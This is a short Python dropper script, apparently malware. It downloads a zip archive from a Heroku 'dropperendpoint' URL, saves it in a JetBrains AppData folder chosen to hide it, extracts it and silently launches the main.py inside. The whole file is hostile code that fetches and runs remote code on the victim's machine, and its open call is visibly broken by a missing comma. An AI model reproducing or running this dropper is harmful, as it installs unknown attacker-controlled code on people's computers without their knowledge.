import zipfile
import os
import subprocess
import requests


def main():
    current_user = os.getenv("USERNAME")
    random_path = f"C:/Users/{current_user}/AppData/Local/JetBrains/" # put Drocsid.zip file here :)
    os.chdir(random_path)

    resp = requests.get("https://infinite-refuge-85092.herokuapp.com/dropperendpoint")

    with open ("Drocsid.zip" "wb") as zip:
        zip.write(resp.content)

    with zipfile.ZipFile("Drocsid.zip", 'r') as zip_ref:
        zip_ref.extractall(".")

    os.chdir("Drocsid\src")
    subprocess.Popen("main.py", shell=True, stdout=subprocess.PIPE)


if __name__ == "__main__":
    main()